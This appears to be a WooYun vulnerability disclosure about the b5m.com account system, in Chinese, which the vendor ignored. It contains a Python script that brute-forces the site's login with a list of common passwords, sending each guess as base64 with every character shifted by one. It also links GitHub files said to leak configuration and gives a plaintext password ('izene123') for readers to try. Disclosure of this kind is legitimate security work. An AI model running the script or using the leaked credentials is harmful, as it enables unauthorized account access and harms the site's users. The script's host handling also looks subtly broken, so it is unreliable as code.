wybug_title: 帮5买账户体系控制不严导致敏感信息泄露
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-11-01：	细节已通知厂商并且等待厂商处理中									2015-11-02：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 竟然有人关注我这样的小白。。。 详细说明：  http://ucenter.b5m.com/tologin.htm
#!/usr/bin/pythonfrom urllib import urlencodeimport httplibimport base64def encode(username, password):	base64_string = base64.encodestring(username + ":" + password)	encrypt_string = ''	for chr_code in base64_string :		encrypt_string += chr(ord(chr_code)+1)	return encrypt_stringdef login(encode):	headers = {		"User-Agent": "Apache-HttpClient/UNAVAILABLE (java 1.4)",		"Content-Type": "application/x-www-form-urlencoded",		"Host": "ucenter.b5m.com/tologin.htm"}	con = httplib.HTTPConnection("ucenter.b5m.com/tologin.htm")	params =  {"auth" : encode}	encode_params = urlencode(params)	con.request("POST", "/authorize",encode_params,headers)	response = con.getresponse()	return response.status	if __name__ == '__main__' :	username = "xxx@xxx.com"	passwords = ("000000","111111","222222","333333","444444","555555","666666","777777","888888","999999","password here")		for password in passwords :		print "trying " + password		if login(encode(username,password)) == 200:			print username + "'s password is " + password			break	else :		print "brut failed!"
   漏洞证明：  送个邮箱：https://github.com/what-code/raindrop/blob/a1ae38466aa1e20818082e6f86f5a53dd7cb0f45/raindrop-storm-collector/src/main/java/com/b5m/raindrop/storm/collector/bolts/EmailBolt.java

https://github.com/what-code/maven_test/blob/5bef2a8ab13b28793c3d69badd24988ed72dd8c7/src/main/java/mybatis/SqlMap.properties

密码：izene123   可以试试。   修复方案：     版权声明：转载请注明来源 随风的风@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-02 10:55 厂商回复： 谢谢随风的风关注 最新状态： 暂无
